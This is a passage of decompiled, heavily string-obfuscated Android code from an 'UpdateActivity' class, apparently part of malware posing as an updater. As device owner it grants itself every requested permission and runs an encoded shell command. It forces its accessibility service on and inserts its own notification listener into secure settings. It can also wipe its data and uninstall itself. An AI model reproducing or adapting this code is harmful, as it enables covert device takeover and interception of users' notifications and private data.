                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 10000L);
                        break;
                    case 5:
                        String str8 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 6:
                        String str9 = UpdateActivity.f1678l;
                        C2194a.m3500t(C2349s0.class, null).show(updateActivity.getSupportFragmentManager(), AbstractC1387m.m2421h(new byte[]{88, -23, -7, 47, -63, -19, 45, 63, 107, -5, -28, 46, -48, -15, 43, 56, 64, -5, -45, 37, -53, -28, 36, 34, 83}, new byte[]{52, -120, -116, 65, -94, -123, 72, 77}));
                        break;
                    case 7:
                        String str10 = UpdateActivity.f1678l;
                        updateActivity.m1601t();
                        break;
                    case 8:
                        updateActivity.f1687j++;
                        Handler handler2 = updateActivity.f1688k;
                        handler2.removeCallbacksAndMessages(null);
                        handler2.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i17) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 1000L);
                        if (updateActivity.f1687j >= 10) {
                            updateActivity.f1687j = 0;
                            updateActivity.f1682e.setVisibility(0);
                        }
                        break;
                    default:
                        String str11 = UpdateActivity.f1678l;
                        new C1445y2(AbstractC1387m.m2421h(new byte[]{89, -15}, new byte[]{23, -94, 17, -110, -3, 93, 70, -67}), updateActivity);
                        break;
                }
            }
        });
        final int i16 = 9;
        this.f1680c.setOnClickListener(new View.OnClickListener(this) { // from class: e0.v2

            /* JADX INFO: renamed from: c */
            public final /* synthetic */ UpdateActivity f3455c;

            {
                this.f3455c = this;
            }

            /* JADX WARN: Code duplicated, block: B:107:0x03a5  */
            /* JADX WARN: Code duplicated, block: B:113:0x03dc  */
            /* JADX WARN: Code duplicated, block: B:134:0x01c9 A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:136:0x01af A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:52:0x01b5  */
            /* JADX WARN: Code duplicated, block: B:57:0x01d2  */
            /* JADX WARN: Code duplicated, block: B:68:0x0263 A[DONT_INVERT] */
            /* JADX WARN: Code duplicated, block: B:69:0x0265 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            /* JADX WARN: Code duplicated, block: B:73:0x0292 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String[] strArr;
                char c;
                Boolean bool;
                Iterator<AccessibilityServiceInfo> it;
                String string;
                ComponentName componentName;
                String strFlattenToString;
                int i17 = i16;
                final UpdateActivity updateActivity = this.f3455c;
                final int i18 = 1;
                final int i19 = 0;
                switch (i17) {
                    case 0:
                        String str3 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 1:
                        String str4 = UpdateActivity.f1678l;
                        AbstractC3656k.m5875u(updateActivity, new Intent(updateActivity, (Class<?>) ManageAppsActivity.class), null);
                        break;
                    case 2:
                        String str5 = UpdateActivity.f1678l;
                        if (!((DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-54, -62, -102, 109, 29, -104, -14, 90, -63, -53, -123, 103, 7}, new byte[]{-82, -89, -20, 4, 126, -3, -83, 42}))).isDeviceOwnerApp(updateActivity.getPackageName())) {
                            Context applicationContext = updateActivity.getApplicationContext();
                            try {
                                strArr = applicationContext.getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
                            } catch (PackageManager.NameNotFoundException e) {
                                e.printStackTrace();
                                strArr = new String[0];
                            }
                            if (strArr != null && strArr.length != 0) {
                                ArrayList arrayList = new ArrayList();
                                for (String str6 : strArr) {
                                    if (ContextCompat.checkSelfPermission(applicationContext, str6) != 0) {
                                        arrayList.add(str6);
                                    }
                                }
                                if (!arrayList.isEmpty()) {
                                    ActivityCompat.requestPermissions(updateActivity, (String[]) arrayList.toArray(new String[0]), 100);
                                }
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{50, -84, -96, 96, -101, 114, -102, -12, 58, -93, -86, 113, -111}, new byte[]{83, -49, -61, 5, -24, 1, -13, -106}))).getEnabledAccessibilityServiceList(-1);
                            Boolean bool2 = Boolean.FALSE;
                            Iterator<AccessibilityServiceInfo> it2 = enabledAccessibilityServiceList.iterator();
                            while (it2.hasNext()) {
                                if (it2.next().getId().equals(updateActivity.getPackageName())) {
                                    bool2 = Boolean.TRUE;
                                }
                            }
                            if (!bool2.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{-80, 10, -116, -127, 107, -34, 3, -85, -94, 1, -100, -121, 109, -39, 0, -10, -1, 37, -85, -80, 65, -28, 52, -52, -109, 45, -92, -70, 80, -18, 56, -42, -108, 48, -68, -70, 74, -16, 52}, new byte[]{-47, 100, -24, -13, 4, -73, 103, -123})), null);
                            }
                            break;
                        } else {
                            ComponentName componentName2 = new ComponentName(updateActivity, (Class<?>) DPups.class);
                            String strM2421h = AbstractC1387m.m2421h(new byte[]{-14, -107, 82, 72, 40, 29, 122, 96, -51, -98, 103, 87, 32, 0, 125, 102, -48}, new byte[]{-94, -16, 32, 37, 65, 110, 9, 9});
                            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-5, -44, -62, 93, -26, -81, 31, -75, -16, -35, -35, 87, -4}, new byte[]{-97, -79, -76, 52, -123, -54, 64, -59}));
                            try {
                                String packageName = updateActivity.getPackageName();
                                String[] strArr2 = updateActivity.getPackageManager().getPackageInfo(packageName, 4096).requestedPermissions;
                                if (strArr2 != null) {
                                    int length = strArr2.length;
                                    c = 0;
                                    while (i19 < length) {
                                        try {
                                            devicePolicyManager.setPermissionGrantState(componentName2, packageName, strArr2[i19], 1);
                                            i19++;
                                        } catch (Exception e6) {
                                            e = e6;
                                            e.printStackTrace();
                                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList7 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                            bool = Boolean.FALSE;
                                            it = enabledAccessibilityServiceList7.iterator();
                                            while (it.hasNext()) {
                                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                                    bool = Boolean.TRUE;
                                                }
                                            }
                                            if (!bool.booleanValue()) {
                                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                            }
                                            DevicePolicyManager devicePolicyManager7 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                                            devicePolicyManager7.isDeviceOwnerApp(updateActivity.getPackageName());
                                            Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                            string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                            componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                            if (string == null) {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            } else {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            }
                                            if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                                ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                                                return;
                                            } else if (Build.VERSION.SDK_INT < 29) {
                                                return;
                                            } else {
                                                return;
                                            }
                                        }
                                    }
                                } else {
                                    c = 0;
                                }
                            } catch (Exception e10) {
                                e = e10;
                                c = 0;
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList8 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                            bool = Boolean.FALSE;
                            it = enabledAccessibilityServiceList8.iterator();
                            while (it.hasNext()) {
                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                    bool = Boolean.TRUE;
                                }
                            }
                            if (!bool.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                            }
                            DevicePolicyManager devicePolicyManager8 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                            devicePolicyManager8.isDeviceOwnerApp(updateActivity.getPackageName());
                            try {
                                Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                break;
                            } catch (IOException unused2) {
                            }
                            try {
                                string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                if (string == null && string.contains(componentName.flattenToString())) {
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{63, -125, 40, -126, 59, -101, -86, 81, 5, -123, 51, -123, 125, -98, -96, 67, 5, -119, 50, -114, 47, -46, -88, 92, 3, -119, Base64.padSymbol, -113, 36, -46, -82, 66, 16, -126, 40, -114, 57, -36}, new byte[]{113, -20, 92, -21, 93, -14, -55, 48}));
                                } else {
                                    if (string != null || string.isEmpty()) {
                                        strFlattenToString = componentName.flattenToString();
                                    } else {
                                        StringBuilder sb = new StringBuilder();
                                        sb.append(string);
                                        byte[] bArr2 = new byte[1];
                                        bArr2[c] = 55;
                                        sb.append(AbstractC1387m.m2421h(bArr2, new byte[]{13, 42, -127, ByteCompanionObject.MIN_VALUE, -4, -26, 59, -41}));
                                        sb.append(componentName.flattenToString());
                                        strFlattenToString = sb.toString();
                                    }
                                    Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                }
                            } catch (Exception e11) {
                                Log.e(strM2421h, AbstractC1387m.m2421h(new byte[]{-47, 14, 100, 118, -81, -49, -8, 87, -8, 79, 106, 104, -85, -59, -84, 3, -7, 0, 121, 115, -84, -62, -69, 66, -29, 6, 98, 116, -22, -57, -79, 80, -29, 10, 99, ByteCompanionObject.MAX_VALUE, -72, -117, -88, 70, -27, 2, 100, 105, -71, -62, -73, 77, -83, 79}, new byte[]{-105, 111, 13, 26, -54, -85, -40, 35}) + e11.getMessage());
                            }
                        }
                        if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                        } else if (Build.VERSION.SDK_INT < 29 && ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{-98, -29, -58, 50, 77, 42, -53, 38, -113, -24, -48, 45, 75, 48, -36, 97, -112, -29, -116, 1, 97, 0, -22, 91, -84, -46, -32, 1, 97, 8, -24, 90, -80, -40, -20, 4, 125, 15, -32, 75, -66, -39, -21, 15, 108}, new byte[]{-1, -115, -94, 64, 34, 67, -81, 8})) != 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{-51, 34, -45, -116, 87, 2, 116, -126, -36, 41, -59, -109, 81, 24, 99, -59, -61, 34, -103, -65, 123, 40, 85, -1, -1, 19, -11, -65, 123, 32, 87, -2, -29, 25, -7, -70, 103, 39, 95, -17, -19, 24, -2, -79, 118}, new byte[]{-84, 76, -73, -2, 56, 107, 16, -84})}, 100);
                            break;
                        }
                        break;
                    case 3:
                        String str7 = UpdateActivity.f1678l;
                        C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{102, 120, 47, -40, 75}, new byte[]{34, 40, 90, -88, 56, 83, 4, 111}), false);
                        SharedPreferences.Editor editorEdit = updateActivity.getSharedPreferences(C3277a.f9610c, 0).edit();
                        editorEdit.clear();
                        editorEdit.apply();
                        SharedPreferences.Editor editorEdit2 = updateActivity.getSharedPreferences(C2571e.f7130b, 0).edit();
                        editorEdit2.clear();
                        editorEdit2.apply();
                        File[] fileArrListFiles = updateActivity.getFilesDir().listFiles();
                        if (fileArrListFiles != null) {
                            for (File file : fileArrListFiles) {
                                file.delete();
                            }
                        }
                        File[] fileArrListFiles2 = updateActivity.getCacheDir().listFiles();
                        if (fileArrListFiles2 != null) {
                            int length2 = fileArrListFiles2.length;
                            while (i19 < length2) {
                                fileArrListFiles2[i19].delete();
                                i19++;
                            }
                        }
                        break;
                    case 4:
                        updateActivity.f1685h.setEnabled(false);
                        Handler handler = new Handler(Looper.getMainLooper());
                        updateActivity.m1600s(AbstractC1387m.m2421h(new byte[]{-99, 73, 20, -43, 25, -99, 12}, new byte[]{-12, 39, 125, -95, 112, -4, 96, -126}));
                        while (i18 <= 4) {
                            handler.postDelayed(new RunnableC0010c(updateActivity, i18, 6), ((long) i18) * 2000);
                            i18++;
                        }
                        handler.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i19) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
